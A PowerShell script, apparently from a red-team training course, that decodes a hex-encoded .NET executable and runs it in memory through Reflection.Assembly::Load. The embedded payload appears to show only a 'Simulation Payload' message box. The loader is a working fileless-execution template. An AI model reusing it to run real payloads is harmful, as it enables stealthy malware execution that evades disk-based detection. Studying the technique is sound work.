
function ReturnHex {
    param($IITJCmN)
    $IITJCmN = $IITJCmN -split '(..)' | ? { $_ }
    ForEach ($KMCAYfPj in $IITJCmN){
        [Convert]::ToInt32($KMCAYfPj,16)
    }
}
function ReturnHex2 {
    param(
        [string]$HexString  # El parámetro de entrada debe ser una cadena hexadecimal
    )

    # Dividir la cadena hexadecimal en pares de caracteres
    $HexPairs = $HexString -split '(..)' | Where-Object { $_ }

    # Convertir cada par de caracteres en un número entero en base 16 (hexadecimal)
    $IntValues = foreach ($HexPair in $HexPairs) {
        [Convert]::ToInt32($HexPair, 16)
    }

    # Devolver la matriz de valores enteros
    # byte[]
    return $IntValues
}



function Callme(){

  ## Codigo en Bits
  [String]$content = "4D5A90000300000004000000FFFF0000B800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000E1FBA0E00B409CD21B8014CCD21546869732070726F6772616D2063616E6E6F742062652072756E20696E20444F53206D6F64652E0D0D0A2400000000000000504500004C0103008079A5AC0000000000000000E00022000B013000000E00000008000000000000C62D0000002000000040000000004000002000000002000004000000000000000600000000000000008000000002000000000000020060850000100000100000000010000010000000000000100000000000000000000000742D00004F000000004000008C05000000000000000000000000000000000000006000000C000000E82C0000380000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002E74657874000000CC0D000000200000000E000000020000000000000000000000000000200000602E727372630000008C050000004000000006000000100000000000000000000000000000400000402E72656C6F6300000C0000000060000000020000001600000000000000000000000000004000004200000000000000000000000000000000A82D000000000000480000000200050008210000280B00000300020001000006302C0000B80000000000000000000000000000000000000000000000000000000000000000000000000000000000000036007201000070281400000A262A2602281500000A00002A133002003900000001000011007E0100000414FE010A062C2200724B000070D003000002281600000A6F1700000A731800000A0B078001000004007E010000040C2B00082A000000133001000B00000002000011007E020000040A2B00062A22000280020000042A133001000B00000003000011007E030000040A2B00062A2202281900000A002A567307000006281A00000A740400000280030000042A000042534A4201000100000000000C00000076342E302E33303331390000000005006C00000090030000237E0000FC0300007804000023537472696E677300000000740800008400000023555300F8080000100000002347554944000000080900002002000023426C6F6200000000000000020000015715A2010901000000FA013300160000010000001F000000040000000300000008000000010000001A000000160000000300000002000000030000000400000001000000030000000100000000009A0201000000000006000902A70306007602A7030600240175030F00FD030000060065011E030600EC011E030600CD011E0306005D021E03060029021E03060042021E0306007C011E030600510188030600E20088030600B0011E0306009701A40206003B04DC020600B400DC020A00F00050030600070175030600C700A70306004003C7030600300309030A009F00BE020A003801BE020A008700F4020E00600426040E004E04260406005A00DC0206003600DC0206006F041E030A009200F402000000000100000000000100010080011000D4020A0041000100010000001000CE030C04410001000200000110001D040C046500030006001100E30261001100770065001100260069005020000000009100EF026D0001005E2000000000831868030600010068200000000093083C0371000100B0200000000093085F0076000100C7200000000093086B007B000100D020000000009608420481000200E720000000008618680306000200F0200000000091186E036D000200000001009402090068030100110068030600190068030A00290068031000310068031000390068031000410068031000490068031000510068031000590068031000610068031500690068031000710068031000790068031000890068030600910068031A00990068030600A10068030600C10068032000D1005B042600810068030600E10048003400E1006B043B00A90068034000C90068030600F9001900510020007B00740129009B0014022E000B0095002E0013009E002E001B00BD002E002300C6002E002B00D1002E003300D1002E003B00D1002E004300C6002E004B00D7002E005300D1002E005B00D1002E006300EF002E006B0019012E007300260149009B00140263008300790163008B00740163009300740183009300740183008300BA012C0047004C00030001000400030000004003860000007F008B000000460490000200030003000200040005000100050005000200060007000480000001000000000000000000000000000A00000004000000000000000000000058001000000000000400000000000000000000005800DC020000000004000000000000000000000058002604000000000000000001000000D80300000000003C4D6F64756C653E004361726761006D73636F726C69620053796E6368726F6E697A65640064656661756C74496E7374616E63650052756E74696D655479706548616E646C65004765745479706546726F6D48616E646C650054797065006765745F43756C74757265007365745F43756C74757265007265736F7572636543756C74757265004170706C69636174696F6E53657474696E67734261736500456469746F7242726F777361626C6553746174650053544154687265616441747472696275746500436F6D70696C657247656E65726174656441747472696275746500477569644174747269627574650047656E657261746564436F64654174747269627574650044656275676765724E6F6E55736572436F64654174747269627574650044656275676761626C6541747472696275746500456469746F7242726F777361626C6541747472696275746500436F6D56697369626C6541747472696275746500417373656D626C795469746C6541747472696275746500417373656D626C7954726164656D61726B417474726962757465005461726765744672616D65776F726B41747472696275746500417373656D626C7946696C6556657273696F6E41747472696275746500417373656D626C79436F6E66696775726174696F6E41747472696275746500417373656D626C794465736372697074696F6E41747472696275746500436F6D70696C6174696F6E52656C61786174696F6E7341747472696275746500417373656D626C7950726F6475637441747472696275746500417373656D626C79436F7079726967687441747472696275746500417373656D626C79436F6D70616E794174747269627574650052756E74696D65436F6D7061746962696C6974794174747269627574650076616C75650043617267612E6578650053797374656D2E52756E74696D652E56657273696F6E696E670053797374656D2E436F6D706F6E656E744D6F64656C0050726F6772616D0053797374656D007265736F757263654D616E004D61696E0053797374656D2E436F6E66696775726174696F6E0053797374656D2E476C6F62616C697A6174696F6E0053797374656D2E5265666C656374696F6E0043756C74757265496E666F006765745F5265736F757263654D616E616765720053797374656D2E436F6465446F6D2E436F6D70696C6572002E63746F72002E6363746F720053797374656D2E446961676E6F73746963730053797374656D2E52756E74696D652E496E7465726F7053657276696365730053797374656D2E52756E74696D652E436F6D70696C657253657276696365730053797374656D2E5265736F75726365730043617267612E50726F706572746965732E5265736F75726365732E7265736F757263657300446562756767696E674D6F6465730043617267612E50726F706572746965730053657474696E67730053797374656D2E57696E646F77732E466F726D73004F626A656374006765745F44656661756C74004469616C6F67526573756C740053686F77004D657373616765426F78006765745F417373656D626C7900004943005500520053004F002000520054004F0044002100210021002000530069006D0075006C006100630069006F006E0020005000610079006C006F006100640020005B002B005D000035430061007200670061002E00500072006F0070006500720074006900650073002E005200650073006F0075007200630065007300000000009063B3AF56B5144A822F6C43C48E8C0100042001010803200001052001011111042001010E0420010102052002010E0E05200101115D050001116D0E0707030212551255060001127111750420001279062002010E127904070112590407011210060001127D127D08B77A5C561934E089030612550306125903061210030000010400001255040000125905000101125904000012100408001255040800125904080012100801000800000000001E01000100540216577261704E6F6E457863657074696F6E5468726F7773010801000701000000000A0100054361726761000005010000000017010012436F7079726967687420C2A920203230323200002901002431346465653237652D313130342D343630632D623935332D32373932313631373235643400000C010007312E302E302E3000004D01001C2E4E45544672616D65776F726B2C56657273696F6E3D76342E372E320100540E144672616D65776F726B446973706C61794E616D65142E4E4554204672616D65776F726B20342E372E3204010000004001003353797374656D2E5265736F75726365732E546F6F6C732E5374726F6E676C7954797065645265736F757263654275696C64657207342E302E302E3000005901004B4D6963726F736F66742E56697375616C53747564696F2E456469746F72732E53657474696E677344657369676E65722E53657474696E677353696E676C6546696C6547656E657261746F720831312E302E302E300000080100020000000000000000B4000000CECAEFBE01000000910000006C53797374656D2E5265736F75726365732E5265736F757263655265616465722C206D73636F726C69622C2056657273696F6E3D342E302E302E302C2043756C747572653D6E65757472616C2C205075626C69634B6579546F6B656E3D623737613563353631393334653038392353797374656D2E5265736F75726365732E52756E74696D655265736F7572636553657402000000000000000000000050414450414450B400000000000000700CC1AB000000000200000054000000202D0000200F00000000000000000000000000001000000000000000000000000000000052534453CC08373014FD134BAA2F3AB1AF5B01E601000000433A5C55736572735C6434726B635C736F757263655C7265706F735C43617267615C43617267615C6F626A5C44656275675C43617267612E706462009C2D00000000000000000000B62D0000002000000000000000000000000000000000000000000000A82D0000000000000000000000005F436F724578654D61696E006D73636F7265652E646C6C0000000000FF250020400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002001000000020000080180000005000008000000000000000000000000000000100010000003800008000000000000000000000000000000100000000008000000000000000000000000000000000000100010000006800008000000000000000000000000000000100000000008C03000090400000FC0200000000000000000000FC0234000000560053005F00560045005200530049004F004E005F0049004E0046004F0000000000BD04EFFE00000100000001000000000000000100000000003F000000000000000400000001000000000000000000000000000000440000000100560061007200460069006C00650049006E0066006F00000000002400040000005400720061006E0073006C006100740069006F006E00000000000000B0045C020000010053007400720069006E006700460069006C00650049006E0066006F0000003802000001003000300030003000300034006200300000001A000100010043006F006D006D0065006E007400730000000000000022000100010043006F006D00700061006E0079004E0061006D0065000000000000000000340006000100460069006C0065004400650073006300720069007000740069006F006E0000000000430061007200670061000000300008000100460069006C006500560065007200730069006F006E000000000031002E0030002E0030002E003000000034000A00010049006E007400650072006E0061006C004E0061006D0065000000430061007200670061002E0065007800650000004800120001004C006500670061006C0043006F007000790072006900670068007400000043006F0070007900720069006700680074002000A90020002000320030003200320000002A00010001004C006500670061006C00540072006100640065006D00610072006B00730000000000000000003C000A0001004F0072006900670069006E0061006C00460069006C0065006E0061006D0065000000430061007200670061002E0065007800650000002C0006000100500072006F0064007500630074004E0061006D00650000000000430061007200670061000000340008000100500072006F006400750063007400560065007200730069006F006E00000031002E0030002E0030002E003000000038000800010041007300730065006D0062006C0079002000560065007200730069006F006E00000031002E0030002E0030002E00300000009C430000EA0100000000000000000000EFBBBF3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D225554462D3822207374616E64616C6F6E653D22796573223F3E0D0A0D0A3C617373656D626C7920786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E763122206D616E696665737456657273696F6E3D22312E30223E0D0A20203C617373656D626C794964656E746974792076657273696F6E3D22312E302E302E3022206E616D653D224D794170706C69636174696F6E2E617070222F3E0D0A20203C7472757374496E666F20786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7632223E0D0A202020203C73656375726974793E0D0A2020202020203C72657175657374656450726976696C6567657320786D6C6E733D2275726E3A736368656D61732D6D6963726F736F66742D636F6D3A61736D2E7633223E0D0A20202020202020203C726571756573746564457865637574696F6E4C6576656C206C6576656C3D226173496E766F6B6572222075694163636573733D2266616C7365222F3E0D0A2020202020203C2F72657175657374656450726976696C656765733E0D0A202020203C2F73656375726974793E0D0A20203C2F7472757374496E666F3E0D0A3C2F617373656D626C793E0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000C000000C83D00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"


  [Byte[]]$prueba = ReturnHex2 $content

  # $prueba

  # Cargar en memoria e invocar los bytes        .entrypoint ejecuta el método principal
  [Reflection.Assembly]::Load([Byte[]]($prueba)).entrypoint.invoke($null,$null)


}


Callme

